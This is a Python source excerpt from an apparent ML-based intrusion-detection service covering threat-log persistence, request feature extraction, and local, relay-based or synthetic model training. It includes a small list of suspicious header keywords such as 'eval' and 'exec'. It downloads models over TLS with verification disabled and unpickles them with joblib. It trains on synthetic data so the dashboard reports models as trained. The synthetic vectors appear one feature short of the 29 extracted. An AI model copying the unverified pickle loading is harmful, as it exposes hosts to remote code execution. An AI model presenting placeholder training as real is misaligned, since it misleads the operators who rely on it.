        serializable_data = []
        for item in _ml_training_data:
            if isinstance(item, dict):
                serializable_item = {}
                for key, value in item.items():
                    if hasattr(value, 'tolist'):  # numpy array
                        serializable_item[key] = value.tolist()
                    else:
                        serializable_item[key] = value
                serializable_data.append(serializable_item)
            else:
                serializable_data.append(item)
        
        with open(_ML_TRAINING_FILE, 'w') as f:
            json.dump(serializable_data, f, indent=2)
    except Exception as e:
        print(f"[WARNING] Failed to save ML training data: {e}")


def _save_ml_metrics() -> None:
    """Save ML performance metrics."""
    try:
        os.makedirs(os.path.dirname(_ML_METRICS_FILE) or ".", exist_ok=True)
        with open(_ML_METRICS_FILE, 'w') as f:
            json.dump(_ml_performance_metrics, f, indent=2)
    except Exception as e:
        print(f"[WARNING] Failed to save ML metrics: {e}")


def _load_threat_data() -> None:
    """Load threat log and blocked IPs from persistent storage."""
    global _threat_log, _blocked_ips, _WHITELISTED_IPS, _failed_login_tracker, _request_tracker
    global _peer_threats, _fingerprint_tracker, _behavioral_signatures, _proxy_chain_tracker
    global _real_ip_correlation, _honeypot_beacons, _ml_training_data, _ml_performance_metrics
    
    # Load threat log
    try:
        if os.path.exists(_THREAT_LOG_FILE):
            with open(_THREAT_LOG_FILE, 'r') as f:
                _threat_log = json.load(f)
            print(f"[SECURITY] Loaded {len(_threat_log)} threat events from disk")
        else:
            # Load sample threats for fresh installations from the unified
            # JSON directory so behavior is consistent across environments.
            try:
                from AI.path_helper import get_json_file
                sample_file = get_json_file('sample_threats.json')
            except Exception:
                sample_file = os.path.join(os.path.dirname(__file__), '..', 'server', 'json', 'sample_threats.json')

            if os.path.exists(sample_file):
                with open(sample_file, 'r') as f:
                    _threat_log = json.load(f)
                print(f"[SECURITY] Fresh installation detected - loaded {len(_threat_log)} sample threats for training")
    except Exception as e:
        print(f"[WARNING] Failed to load threat log: {e}")
    
    # Load blocked IPs - UNIFIED FORMAT with honeypot
    try:
        if os.path.exists(_BLOCKED_IPS_FILE):
            with open(_BLOCKED_IPS_FILE, 'r') as f:
                blocked_data = json.load(f)
                # Handle new structured format
                if isinstance(blocked_data, dict) and 'blocked_ips' in blocked_data:
                    _blocked_ips = set(entry.get('ip') for entry in blocked_data['blocked_ips'] if entry.get('ip'))
                else:
                    # Legacy simple list format
                    _blocked_ips = set(blocked_data if isinstance(blocked_data, list) else [])
            print(f"[SECURITY] Loaded {len(_blocked_ips)} blocked IPs from disk")
    except Exception as e:
        print(f"[WARNING] Failed to load blocked IPs: {e}")
    
    # Load whitelist
    try:
        if os.path.exists(_WHITELIST_FILE):
            with open(_WHITELIST_FILE, 'r') as f:
                loaded_whitelist = set(json.load(f))
                _WHITELISTED_IPS.update(loaded_whitelist)  # Add to default localhost IPs
            print(f"[SECURITY] Loaded {len(loaded_whitelist)} whitelisted IPs from disk")
    except Exception as e:
        print(f"[WARNING] Failed to load whitelist: {e}")
    
    # Load tracking data (brute force, rate limits, fingerprints)
    try:
        if os.path.exists(_TRACKING_DATA_FILE):
            with open(_TRACKING_DATA_FILE, 'r') as f:
                tracking_data = json.load(f)
            
            # Restore failed login tracker
            for ip, timestamps in tracking_data.get('failed_login_tracker', {}).items():
                _failed_login_tracker[ip] = [datetime.fromisoformat(ts) for ts in timestamps]
            
            # Restore request tracker
            for ip, timestamps in tracking_data.get('request_tracker', {}).items():
                _request_tracker[ip] = [datetime.fromisoformat(ts) for ts in timestamps]
            
            # Restore other trackers
            _fingerprint_tracker.update(tracking_data.get('fingerprint_tracker', {}))
            for ip, sigs in tracking_data.get('behavioral_signatures', {}).items():
                _behavioral_signatures[ip] = sigs
            for ip, chains in tracking_data.get('proxy_chain_tracker', {}).items():
                _proxy_chain_tracker[ip] = chains
            for ip, real_ips in tracking_data.get('real_ip_correlation', {}).items():
                _real_ip_correlation[ip] = set(real_ips)
            _honeypot_beacons.update(tracking_data.get('honeypot_beacons', {}))
            
            print(f"[SECURITY] Loaded tracking data for {len(_failed_login_tracker)} IPs")
    except json.JSONDecodeError as e:
        # Auto-heal corrupted tracking data to avoid repeated noisy warnings
        print(f"[WARNING] Tracking data file is corrupted; resetting to empty state: {e}")
        try:
            backup_path = _TRACKING_DATA_FILE + '.corrupt'
            os.replace(_TRACKING_DATA_FILE, backup_path)
        except Exception as backup_err:
            print(f"[WARNING] Failed to backup corrupted tracking data file: {backup_err}")
        try:
            _failed_login_tracker.clear()
            _request_tracker.clear()
            _fingerprint_tracker.clear()
            _behavioral_signatures.clear()
            _proxy_chain_tracker.clear()
            _real_ip_correlation.clear()
            _honeypot_beacons.clear()
            _save_tracking_data()
        except Exception as reset_err:
            print(f"[WARNING] Failed to reset tracking data file: {reset_err}")
    except Exception as e:
        print(f"[WARNING] Failed to load tracking data: {e}")
    
    # Load peer threats
    try:
        if os.path.exists(_PEER_THREATS_FILE):
            with open(_PEER_THREATS_FILE, 'r') as f:
                _peer_threats = json.load(f)
            print(f"[P2P] Loaded {len(_peer_threats)} peer threat events")
    except json.JSONDecodeError as e:
        print(f"[WARNING] Peer threat file is corrupted; resetting to empty list: {e}")
        try:
            backup_path = _PEER_THREATS_FILE + '.corrupt'
            os.replace(_PEER_THREATS_FILE, backup_path)
        except Exception as backup_err:
            print(f"[WARNING] Failed to backup corrupted peer threats file: {backup_err}")
        try:
            _peer_threats = []
            _save_peer_threats()
        except Exception as reset_err:
            print(f"[WARNING] Failed to reset peer threats file: {reset_err}")
    except Exception as e:
        print(f"[WARNING] Failed to load peer threats: {e}")
    
    # Load ML training data
    try:
        if os.path.exists(_ML_TRAINING_FILE):
            with open(_ML_TRAINING_FILE, 'r') as f:
                _ml_training_data = json.load(f)
            print(f"[ML] Loaded {len(_ml_training_data)} training samples")
    except json.JSONDecodeError as e:
        print(f"[WARNING] ML training data file is corrupted; resetting to empty list: {e}")
        try:
            backup_path = _ML_TRAINING_FILE + '.corrupt'
            os.replace(_ML_TRAINING_FILE, backup_path)
        except Exception as backup_err:
            print(f"[WARNING] Failed to backup corrupted ML training file: {backup_err}")
        try:
            _ml_training_data = []
            _save_ml_training_data()
        except Exception as reset_err:
            print(f"[WARNING] Failed to reset ML training data file: {reset_err}")
    except Exception as e:
        print(f"[WARNING] Failed to load ML training data: {e}")
    
    # Load ML performance metrics
    try:
        if os.path.exists(_ML_METRICS_FILE):
            with open(_ML_METRICS_FILE, 'r') as f:
                _ml_performance_metrics.update(json.load(f))
            print(f"[ML] Loaded performance metrics: {_ml_performance_metrics.get('accuracy', 0):.2%} accuracy")
    except json.JSONDecodeError as e:
        print(f"[WARNING] ML metrics file is corrupted; resetting to defaults: {e}")
        try:
            backup_path = _ML_METRICS_FILE + '.corrupt'
            os.replace(_ML_METRICS_FILE, backup_path)
        except Exception as backup_err:
            print(f"[WARNING] Failed to backup corrupted ML metrics file: {backup_err}")
        try:
            _ml_performance_metrics.clear()
            _ml_performance_metrics.update({
                "predictions_made": 0,
                "true_positives": 0,
                "false_positives": 0,
                "true_negatives": 0,
                "false_negatives": 0,
                "precision": 0.0,
                "recall": 0.0,
                "f1_score": 0.0,
                "accuracy": 0.0,
            })
            _save_ml_metrics()
        except Exception as reset_err:
            print(f"[WARNING] Failed to reset ML metrics file: {reset_err}")
    except Exception as e:
        print(f"[WARNING] Failed to load ML metrics: {e}")
    
    # Fetch GitHub IP ranges and unblock any GitHub IPs
    try:
        _fetch_github_ip_ranges()
    except Exception as e:
        print(f"[WARNING] Failed to fetch GitHub IP ranges: {e}")
    
    try:
        _unblock_github_ips()
    except Exception as e:
        print(f"[WARNING] Failed to unblock GitHub IPs: {e}")
    
    # Load ML models
    try:
        _load_ml_models()
    except Exception as e:
        print(f"[WARNING] Failed to load ML models: {e}")
        import traceback
        traceback.print_exc()


def _unblock_github_ips() -> None:
    """Unblock all IPs that belong to GitHub."""
    global _blocked_ips
    
    if not _GITHUB_IP_RANGES:
        print("[WHITELIST] GitHub IP ranges not loaded, skipping unblock")
        return
    
    github_ips_to_unblock = set()
    
    # Check each blocked IP against GitHub ranges
    for blocked_ip in list(_blocked_ips):
        if _is_github_ip(blocked_ip):
            github_ips_to_unblock.add(blocked_ip)
    
    # Remove GitHub IPs from blocked list
    if github_ips_to_unblock:
        _blocked_ips -= github_ips_to_unblock
        _save_blocked_ips()
        print(f"[WHITELIST] ✅ Unblocked {len(github_ips_to_unblock)} GitHub IPs: {list(github_ips_to_unblock)}")
    else:
        print("[WHITELIST] No GitHub IPs found in blocked list")


# ============================================================================
# REAL AI/ML FUNCTIONS - Machine Learning Core
# ============================================================================

def _train_on_relay_server() -> bool:
    """Request training from relay server using 43,971 ExploitDB exploits.
    
    Instead of downloading 825 MB of training data, client connects to relay,
    relay trains models using all available materials, client downloads trained models (280 KB).
    
    Returns:
        bool: True if training succeeded and models downloaded, False otherwise
    """
    global _anomaly_detector, _threat_classifier, _ip_reputation_model, _feature_scaler
    
    if not ML_AVAILABLE:
        return False
    
    try:
        import requests
        relay_url = os.getenv('RELAY_API_URL', 'https://relay:60002')
        
        # Request remote training
        print(f"[AI] 📡 Connecting to {relay_url}/train ...")
        response = requests.post(f"{relay_url}/train", timeout=300, verify=False)  # 5 min timeout for training
        
        if response.status_code == 200:
            result = response.json()
            if result.get('success'):
                print(f"[AI] ✅ Relay trained models using {result.get('exploits_used', 0)} exploits")
                print(f"[AI] 📊 Accuracy: {result.get('accuracy', 0):.2%} | Time: {result.get('training_time', 0):.1f}s")
                
                # Download trained models
                print("[AI] 📥 Downloading trained models from relay...")
                
                # Download anomaly detector
                model_resp = requests.get(f"{relay_url}/models/anomaly_detector", verify=False)
                if model_resp.status_code == 200:
                    with open(_ANOMALY_MODEL_FILE, 'wb') as f:
                        f.write(model_resp.content)
                    _anomaly_detector = joblib.load(_ANOMALY_MODEL_FILE)
                    print("[AI] ✅ Downloaded anomaly detector")
                
                # Download threat classifier
                model_resp = requests.get(f"{relay_url}/models/threat_classifier", verify=False)
                if model_resp.status_code == 200:
                    with open(_THREAT_CLASSIFIER_FILE, 'wb') as f:
                        f.write(model_resp.content)
                    _threat_classifier = joblib.load(_THREAT_CLASSIFIER_FILE)
                    print("[AI] ✅ Downloaded threat classifier")
                
                # Download IP reputation model
                model_resp = requests.get(f"{relay_url}/models/ip_reputation", verify=False)
                if model_resp.status_code == 200:
                    with open(_IP_REPUTATION_FILE, 'wb') as f:
                        f.write(model_resp.content)
                    _ip_reputation_model = joblib.load(_IP_REPUTATION_FILE)
                    print("[AI] ✅ Downloaded IP reputation model")
                
                # Download feature scaler
                model_resp = requests.get(f"{relay_url}/models/feature_scaler", verify=False)
                if model_resp.status_code == 200:
                    with open(_SCALER_FILE, 'wb') as f:
                        f.write(model_resp.content)
                    _feature_scaler = joblib.load(_SCALER_FILE)
                    print("[AI] ✅ Downloaded feature scaler")
                
                print(f"[AI] 🎉 All models trained remotely and downloaded successfully!")
                return True
            else:
                print(f"[AI] ❌ Relay training failed: {result.get('message')}")
                return False
        else:
            print(f"[AI] ❌ Relay training request failed: HTTP {response.status_code}")
            return False
    
    except Exception as e:
        print(f"[AI] ❌ Relay training error: {e}")
        return False


def _initialize_ml_models() -> None:
    """Initialize ML models for the first time."""
    global _anomaly_detector, _threat_classifier, _ip_reputation_model, _feature_scaler, _ml_last_trained
    
    if not ML_AVAILABLE:
        return
    
    print("[AI] Initializing machine learning models...")
    
    # Anomaly Detection: Unsupervised learning for zero-day attacks
    # IsolationForest detects outliers without labeled data
    _anomaly_detector = IsolationForest(
        n_estimators=100,
        contamination=0.1,  # Expect 10% of traffic to be anomalous
        random_state=42,
        max_samples='auto',
        bootstrap=False
    )
    
    # Threat Classification: Supervised multi-class classifier
    # Classifies attacks into categories: SQL injection, XSS, DDoS, brute force, etc.
    _threat_classifier = RandomForestClassifier(
        n_estimators=200,
        max_depth=20,
        min_samples_split=5,
        min_samples_leaf=2,
        random_state=42,
        n_jobs=-1  # Use all CPU cores
    )
    
    # IP Reputation: Gradient boosting for reputation scoring
    # Predicts if an IP is likely to attack based on behavioral features
    _ip_reputation_model = GradientBoostingClassifier(
        n_estimators=150,
        learning_rate=0.1,
        max_depth=5,
        random_state=42
    )
    
    # Feature Scaler: Normalize features for better ML performance
    _feature_scaler = StandardScaler()
    
    _ml_last_trained = datetime.now(timezone.utc)
    
    print("[AI] ✅ ML models initialized successfully")
    print("[AI] - Anomaly Detector: IsolationForest (unsupervised)")
    print("[AI] - Threat Classifier: RandomForest (multi-class)")
    print("[AI] - IP Reputation: GradientBoosting (binary)")


def _save_ml_models() -> None:
    """Persist ML models to disk."""
    if not ML_AVAILABLE:
        return
    
    try:
        os.makedirs(_ML_MODELS_DIR, exist_ok=True)
        
        if _anomaly_detector is not None:
            joblib.dump(_anomaly_detector, _ANOMALY_MODEL_FILE)
        if _threat_classifier is not None:
            joblib.dump(_threat_classifier, _THREAT_CLASSIFIER_FILE)
        if _ip_reputation_model is not None:
            joblib.dump(_ip_reputation_model, _IP_REPUTATION_FILE)
        if _feature_scaler is not None:
            joblib.dump(_feature_scaler, _SCALER_FILE)
        
        print(f"[AI] ML models saved to {_ML_MODELS_DIR}/")
    except Exception as e:
        print(f"[AI WARNING] Failed to save ML models: {e}")


def _load_ml_models() -> None:
    """Load pre-trained ML models from disk."""
    global _anomaly_detector, _threat_classifier, _ip_reputation_model, _feature_scaler, _ml_last_trained
    
    if not ML_AVAILABLE:
        return
    
    try:
        # Try loading existing models
        if os.path.exists(_ANOMALY_MODEL_FILE):
            _anomaly_detector = joblib.load(_ANOMALY_MODEL_FILE)
            print("[AI] ✅ Loaded anomaly detector from disk")
        
        if os.path.exists(_THREAT_CLASSIFIER_FILE):
            _threat_classifier = joblib.load(_THREAT_CLASSIFIER_FILE)
            print("[AI] ✅ Loaded threat classifier from disk")
        
        if os.path.exists(_IP_REPUTATION_FILE):
            _ip_reputation_model = joblib.load(_IP_REPUTATION_FILE)
            print("[AI] ✅ Loaded IP reputation model from disk")
        
        if os.path.exists(_SCALER_FILE):
            _feature_scaler = joblib.load(_SCALER_FILE)
            print("[AI] ✅ Loaded feature scaler from disk")
        
        if _anomaly_detector is None:
            # No models exist, initialize new ones
            _initialize_ml_models()
        
        # CRITICAL FIX: Check if models are TRAINED, not just initialized
        # Models loaded from .pkl files may be untrained (just structures)
        models_trained = (
            _anomaly_detector is not None and hasattr(_anomaly_detector, 'estimators_') and
            _threat_classifier is not None and hasattr(_threat_classifier, 'classes_') and
            _ip_reputation_model is not None and hasattr(_ip_reputation_model, 'classes_')
        )
        
        if not models_trained:
            # Models exist but are NOT trained
            # OPTION 1: Train on RELAY SERVER (using 43,971 ExploitDB exploits)
            relay_url = os.getenv('RELAY_API_URL', '').strip()
            if os.getenv('RELAY_ENABLED', 'false').lower() == 'true' and relay_url:
                print(f"[AI] 🌐 Requesting training from relay server (43,971 ExploitDB exploits)...")
                print(f"[AI] 📡 Relay URL: {relay_url}")
                if _train_on_relay_server():
                    print("[AI] ✅ Models trained remotely and downloaded from relay")
                    return
                else:
                    print("[AI] ⚠️  Relay training failed, falling back to local training")
            elif os.getenv('RELAY_ENABLED', 'false').lower() == 'true':
                print("[AI] ⚠️  RELAY_ENABLED=true but RELAY_API_URL is empty!")
                print("[AI] 💡 Set RELAY_API_URL=https://your-vps-ip:60002 to enable centralized training")
                print("[AI] 📚 See RELAY_SETUP.md for configuration instructions")
            
            # OPTION 2: Train locally with historical data
            if len(_threat_log) >= 100:
                print(f"[AI] 🎓 AUTO-TRAINING locally with {len(_threat_log)} historical threat events...")
                _train_ml_models_from_history()
            else:
                # OPTION 3: Fallback to synthetic data
                print(f"[AI] ⚠️  Models initialized but NOT TRAINED")
                print(f"[AI] 📚 Need at least 100 threat events to train (have {len(_threat_log)})")
                print(f"[AI] 💡 Generating synthetic training data for immediate deployment...")
                _train_ml_models_with_synthetic_data()
    
    except Exception as e:
        print(f"[AI WARNING] Failed to load ML models: {e}")
        print("[AI] Initializing new models...")
        _initialize_ml_models()
        
        # Attempt synthetic training if no historical data
        if len(_threat_log) < 100:
            print(f"[AI] 💡 Generating synthetic training data for immediate deployment...")
            try:
                _train_ml_models_with_synthetic_data()
            except Exception as train_error:
                print(f"[AI WARNING] Synthetic training failed: {train_error}")


def _extract_features_from_request(ip_address: str, endpoint: str, user_agent: str, 
                                   headers: dict, method: str = "GET") -> np.ndarray:
    """Extract numerical features from request for ML models.
    
    Features (29 dimensions):
    1-4: IP characteristics (octets for IPv4)
    5: Request frequency (requests in last 5 min)
    6: Failed login count
    7: Endpoint length
    8: User agent length
    9-13: Character distribution (digits, special chars, uppercase, lowercase, spaces)
    14: Number of query parameters
    15: HTTP method (encoded as number)
    16: Hour of day
    17: Day of week
    18-20: Timing features (time since first/last request, request interval variance)
    21-25: Header features (header count, proxy headers, missing UA, suspicious headers)
    26: VPN/Proxy detected (binary)
    27-28: Geographic features (placeholder for lat/lon)
    29: Fingerprint uniqueness score
    """
    if not ML_AVAILABLE:
        return np.array([])
    
    features = []
    
    # IP features (4): Convert IP to numerical
    ip_parts = ip_address.replace("::", "0").split(".")[:4]
    for i in range(4):
        features.append(float(ip_parts[i]) if i < len(ip_parts) else 0.0)
    
    # Request frequency (1)
    request_count = len(_request_tracker.get(ip_address, []))
    features.append(float(request_count))
    
    # Failed login count (1)
    failed_logins = len(_failed_login_tracker.get(ip_address, []))
    features.append(float(failed_logins))
    
    # Endpoint features (6)
    features.append(float(len(endpoint)))  # Length
    features.append(float(len(user_agent)))  # UA length
    
    # Character distribution in endpoint
    digits = sum(c.isdigit() for c in endpoint)
    special = sum(not c.isalnum() and not c.isspace() for c in endpoint)
    uppercase = sum(c.isupper() for c in endpoint)
    lowercase = sum(c.islower() for c in endpoint)
    spaces = sum(c.isspace() for c in endpoint)
    features.extend([float(digits), float(special), float(uppercase), float(lowercase), float(spaces)])
    
    # Query parameters (1)
    query_params = endpoint.count('&') + (1 if '?' in endpoint else 0)
    features.append(float(query_params))
    
    # HTTP method (1)
    method_encoding = {'GET': 1.0, 'POST': 2.0, 'PUT': 3.0, 'DELETE': 4.0, 'HEAD': 5.0}.get(method, 0.0)
    features.append(method_encoding)
    
    # Temporal features (2)
    now = datetime.now(timezone.utc)
    features.append(float(now.hour))  # Hour of day
    features.append(float(now.weekday()))  # Day of week
    
    # Timing patterns (3)
    requests = _request_tracker.get(ip_address, [])
    if len(requests) > 1:
        time_since_first = (now - requests[0]).total_seconds()
        time_since_last = (now - requests[-1]).total_seconds()
        intervals = [(requests[i] - requests[i-1]).total_seconds() for i in range(1, len(requests))]
        interval_variance = np.var(intervals) if intervals else 0.0
        features.extend([time_since_first, time_since_last, float(interval_variance)])
    else:
        features.extend([0.0, 0.0, 0.0])
    
    # Header features (5)
    features.append(float(len(headers)))  # Number of headers
    
    proxy_headers = sum(1 for h in ['x-forwarded-for', 'x-real-ip', 'via', 'forwarded'] 
                       if h in {k.lower() for k in headers.keys()})
    features.append(float(proxy_headers))
    
    missing_ua = 1.0 if not user_agent else 0.0
    features.append(missing_ua)
    
    # Suspicious header patterns
    suspicious_headers = sum(1 for v in headers.values() if isinstance(v, str) and 
                            any(p in v.lower() for p in ['script', 'eval', 'exec', 'cmd']))
    features.append(float(suspicious_headers))
    
    # Header injection indicators
    header_injection = sum(1 for v in headers.values() if isinstance(v, str) and 
                          ('\\r\\n' in v or '\\n' in v))
    features.append(float(header_injection))
    
    # VPN/Proxy detection (1)
    vpn_detected = 1.0 if proxy_headers > 0 else 0.0
    features.append(vpn_detected)
    
    # Geographic features (2) - placeholder, would use actual geo data
    features.extend([0.0, 0.0])  # lat, lon
    
    # Fingerprint uniqueness (1)
    fingerprint_ips = len(_fingerprint_tracker.get(ip_address, {}).get('ips_used', set()))
    features.append(float(fingerprint_ips))
    
    features_array = np.array(features)
    
    # Update node fingerprint statistics (for federated normalization)
    if NODE_FP_AVAILABLE:
        node_fp.update_feature_statistics(features_array)
        
        # Detect distribution drift (features significantly different from this node's profile)
        has_drift, drifted_features = node_fp.detect_distribution_drift(features_array)
        if has_drift:
            logger.warning(f"[NODE-FP] Distribution drift detected in features: {drifted_features}")
    
    return features_array


def _ml_predict_anomaly(features: np.ndarray) -> Tuple[bool, float]:
    """Use ML to detect if request is anomalous.
    
    Returns:
        (is_anomaly, anomaly_score) where score is between -1 and 1
        (more negative = more anomalous)
    """
    if not ML_AVAILABLE or _anomaly_detector is None:
        return False, 0.0
    
    try:
        # Reshape for single prediction
        features_2d = features.reshape(1, -1)
        
        # Scale features
        if _feature_scaler is not None and hasattr(_feature_scaler, 'mean_'):
            features_2d = _feature_scaler.transform(features_2d)
        
        # Predict: -1 for anomaly, 1 for normal
        prediction = _anomaly_detector.predict(features_2d)[0]
        
        # Get anomaly score (more negative = more anomalous)
        score = _anomaly_detector.score_samples(features_2d)[0]
        
        is_anomaly = (prediction == -1)
        
        return is_anomaly, float(score)
    
    except Exception as e:
        print(f"[AI WARNING] Anomaly prediction failed: {e}")
        return False, 0.0


def _ml_classify_threat(features: np.ndarray) -> Tuple[str, float]:
    """Use ML to classify threat type.
    
    Returns:
        (threat_type, confidence) where threat_type is one of:
        'sql_injection', 'xss', 'ddos', 'brute_force', 'scanner', 'safe'
    """
    if not ML_AVAILABLE or _threat_classifier is None or not hasattr(_threat_classifier, 'classes_'):
        return 'unknown', 0.0
    
    try:
        features_2d = features.reshape(1, -1)
        
        if _feature_scaler is not None and hasattr(_feature_scaler, 'mean_'):
            features_2d = _feature_scaler.transform(features_2d)
        
        # Get probabilities for each class
        probabilities = _threat_classifier.predict_proba(features_2d)[0]
        
        # Get class with highest probability
        class_idx = np.argmax(probabilities)
        threat_type = _threat_classifier.classes_[class_idx]
        confidence = float(probabilities[class_idx])
        
        return threat_type, confidence
    
    except Exception as e:
        print(f"[AI WARNING] Threat classification failed: {e}")
        return 'unknown', 0.0


def _calculate_threat_weight(threat_timestamp: datetime) -> float:
    """Calculate time-based weight for a threat (recent = higher weight).
    
    Weighting strategy:
    - Threats < 7 days old: 10x weight (capture fresh attack patterns)
    - Threats 7-30 days old: Exponential decay from 10x to 1x
    - Threats 30-90 days old: Exponential decay from 1x to 0.1x
    - Threats > 90 days old: Removed (sliding window)
    
    Returns:
        Weight multiplier (float between 0.1 and 10.0)
    """
    now = datetime.now(timezone.utc)
    
    # Parse threat timestamp
    if isinstance(threat_timestamp, str):
        try:
            threat_timestamp = datetime.fromisoformat(threat_timestamp.replace('Z', '+00:00'))
        except:
            return 1.0  # Default weight if timestamp parsing fails
    
    # Ensure both datetimes are offset-aware or offset-naive
    if threat_timestamp.tzinfo is None:
        threat_timestamp = threat_timestamp.replace(tzinfo=timezone.utc)
    
    age_days = (now - threat_timestamp).total_seconds() / 86400
    
    # Remove threats older than 90 days
    if age_days > _THREAT_LOG_MAX_AGE_DAYS:
        return 0.0  # Will be filtered out
    
    # Recent threats (< 7 days): Maximum weight
    if age_days < 7:
        return _RECENT_THREAT_MULTIPLIER
    
    # Exponential decay: weight = e^(-age / decay_period)
    # After 30 days: weight ~= 1.0, After 60 days: weight ~= 0.37, After 90 days: weight ~= 0.14
    import math
    weight = math.exp(-age_days / _TIME_WEIGHT_DECAY_DAYS)
    
    # Clamp to reasonable range
    return max(0.1, min(weight, _RECENT_THREAT_MULTIPLIER))


def _expire_old_threats() -> int:
    """Remove threats older than 90 days from threat log (sliding window).
    
    Returns:
        Number of threats expired
    """
    global _threat_log, _peer_threats
    
    now = datetime.now(timezone.utc)
    cutoff_date = now - timedelta(days=_THREAT_LOG_MAX_AGE_DAYS)
    
    # Filter local threats
    original_count = len(_threat_log)
    _threat_log = [
        t for t in _threat_log
        if _parse_threat_timestamp(t.get('timestamp')) > cutoff_date
    ]
    local_expired = original_count - len(_threat_log)
    
    # Filter peer threats
    original_peer_count = len(_peer_threats)
    _peer_threats = [
        t for t in _peer_threats
        if _parse_threat_timestamp(t.get('timestamp')) > cutoff_date
    ]
    peer_expired = original_peer_count - len(_peer_threats)
    
    total_expired = local_expired + peer_expired
    
    if total_expired > 0:
        print(f"[AI] Expired {total_expired} old threats (local: {local_expired}, peer: {peer_expired}) - keeping last {_THREAT_LOG_MAX_AGE_DAYS} days")
        # Save updated logs
        _save_threat_log()
        _save_peer_threats()
    
    return total_expired


def _parse_threat_timestamp(timestamp_str) -> datetime:
    """Parse threat timestamp with fallback for various formats."""
    if isinstance(timestamp_str, datetime):
        # Ensure timezone-aware for comparison
        if timestamp_str.tzinfo is None:
            return timestamp_str.replace(tzinfo=timezone.utc)
        return timestamp_str
    
    try:
        dt = datetime.fromisoformat(timestamp_str.replace('Z', '+00:00'))
        # Keep timezone-aware for comparison
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt
    except:
        # Fallback to very old date (timezone-aware)
        return datetime(2000, 1, 1, tzinfo=timezone.utc)


def _ml_predict_ip_reputation(features: np.ndarray) -> Tuple[bool, float]:
    """Predict if IP is malicious based on behavioral features.
    
    Returns:
        (is_malicious, confidence)
    """
    if not ML_AVAILABLE or _ip_reputation_model is None or not hasattr(_ip_reputation_model, 'classes_'):
        return False, 0.0
    
    try:
        features_2d = features.reshape(1, -1)
        
        if _feature_scaler is not None and hasattr(_feature_scaler, 'mean_'):
            features_2d = _feature_scaler.transform(features_2d)
        
        # Predict probability of being malicious
        probabilities = _ip_reputation_model.predict_proba(features_2d)[0]
        
        # Assuming class 1 = malicious, class 0 = benign
        if len(probabilities) > 1:
            malicious_prob = float(probabilities[1])
            is_malicious = malicious_prob > 0.7  # Threshold
            return is_malicious, malicious_prob
        
        return False, 0.0
    
    except Exception as e:
        print(f"[AI WARNING] IP reputation prediction failed: {e}")
        return False, 0.0


def _train_ml_models_with_synthetic_data() -> None:
    """Train ML models with synthetic threat data for immediate deployment.
    
    Generates 200 synthetic threat samples across different attack types
    so new deployments have working ML models immediately instead of
    showing "NOT TRAINED" until real attacks occur.
    
    This ensures:
    - Dashboard shows models as "TRAINED" on first startup
    - Models can make predictions immediately (even if not perfect)
    - Cross-platform compatibility (no .pkl/.keras file dependencies)
    """
    global _ml_last_trained, _anomaly_detector, _threat_classifier, _ip_reputation_model, _feature_scaler
    
    if not ML_AVAILABLE:
        return
    
    print("[AI] 🧪 Generating synthetic training data for immediate deployment...")
    
    try:
        # Synthetic attack patterns
        attack_types = [
            "sql_injection", "xss", "ddos", "brute_force", "port_scan",
            "directory_traversal", "command_injection", "safe", "safe", "safe"
        ]
        
        features_list = []
        labels_list = []
        anomaly_labels = []
        
        # Generate 200 synthetic samples
        for i in range(200):
            attack_type = attack_types[i % len(attack_types)]
            
            # Generate realistic-looking features (29 dimensions)
            if attack_type == "sql_injection":
                features = [
                    192.0, 168.0, 1.0, float(i % 255),  # IP
                    float((i % 10) + 5),  # High request frequency
                    float(i % 3),  # Failed logins
                    float(50 + (i % 100)),  # Endpoint length (longer for SQLi)
                    100.0,  # UA length
                    float(5 + (i % 10)),  # digits in endpoint
                    float(10 + (i % 15)),  # special chars (quotes, semicolons)
                    float(i % 5), float(i % 20), float(i % 3),  # case/spaces
                    float(3 + (i % 5)),  # query params
                    1.0, float(i % 24), float(i % 7),  # method, hour, day
                    float(i % 1000), float(i % 100), 50.0,  # timing
                    float(8 + (i % 5)), 0.0, 0.0, float(i % 3),  # headers
                    0.0, 0.0, 0.0, 0.5  # geo, fingerprint
                ]
            elif attack_type == "xss":
                features = [
                    10.0, 0.0, float(i % 255), float(i % 255),  # IP
                    float(i % 8),  # request frequency
                    0.0,  # failed logins
                    float(40 + (i % 80)),  # endpoint length
                    80.0,  # UA length
                    float(i % 5), float(15 + (i % 10)),  # digits, special (< > ")
                    float(i % 10), float(i % 15), float(i % 2),
                    float(1 + (i % 3)),  # query params
                    1.0, float(i % 24), float(i % 7),
                    float(i % 800), float(i % 80), 30.0,
                    float(6 + (i % 4)), 0.0, 0.0, float(i % 2),
                    0.0, 0.0, 0.0, 0.4
                ]
            elif attack_type == "brute_force":
                features = [
                    172.0, 16.0, float(i % 255), float(i % 255),  # IP
                    float(15 + (i % 20)),  # Very high request frequency
                    float(10 + (i % 30)),  # Many failed logins
                    20.0 + float(i % 10),  # Short endpoint (login page)
                    50.0,  # Short UA (bot)
                    float(i % 3), float(i % 3),  # Low special chars
                    float(i % 5), float(i % 10), float(i % 2),
                    0.0,  # No query params
                    2.0, float(i % 24), float(i % 7),  # POST method
                    float(i % 100), float(i % 10), 5.0,  # Fast timing
                    float(4 + (i % 2)), 0.0, 0.0, 0.0,
                    0.0, 0.0, 0.0, 0.2
                ]
            elif attack_type == "safe":
                features = [
                    192.0, 168.0, 0.0, float(i % 255),  # Local IP
                    float(1 + (i % 3)),  # Low request frequency
                    0.0,  # No failed logins
                    float(15 + (i % 20)),  # Normal endpoint length
                    120.0,  # Normal UA
                    float(i % 2), float(i % 5),  # Normal chars
                    float(i % 8), float(i % 12), float(i % 3),
                    float(i % 2),  # Few query params
                    1.0, float(i % 24), float(i % 7),
                    float(i % 5000), float(i % 500), 100.0,  # Slow timing
                    float(8 + (i % 3)), 0.0, 0.0, 0.0,
                    0.0, 0.0, 0.0, 0.8
                ]
            else:  # Other attack types (simplified)
                features = [
                    float(i % 255), float(i % 255), float(i % 255), float(i % 255),
                    float(5 + (i % 10)), float(i % 5),
                    float(30 + (i % 50)), 90.0,
                    float(i % 8), float(8 + (i % 10)),
                    float(i % 8), float(i % 15), float(i % 3),
                    float(i % 4), 1.0, float(i % 24), float(i % 7),
                    float(i % 2000), float(i % 200), 60.0,
                    float(7 + (i % 4)), 0.0, 0.0, float(i % 2),
                    0.0, 0.0, 0.0, 0.5
                ]
            
            features_list.append(features)
            labels_list.append(attack_type)
            anomaly_labels.append(1 if attack_type != "safe" else 0)
        
        X = np.array(features_list)
        y_threat = np.array(labels_list)
        y_anomaly = np.array(anomaly_labels)
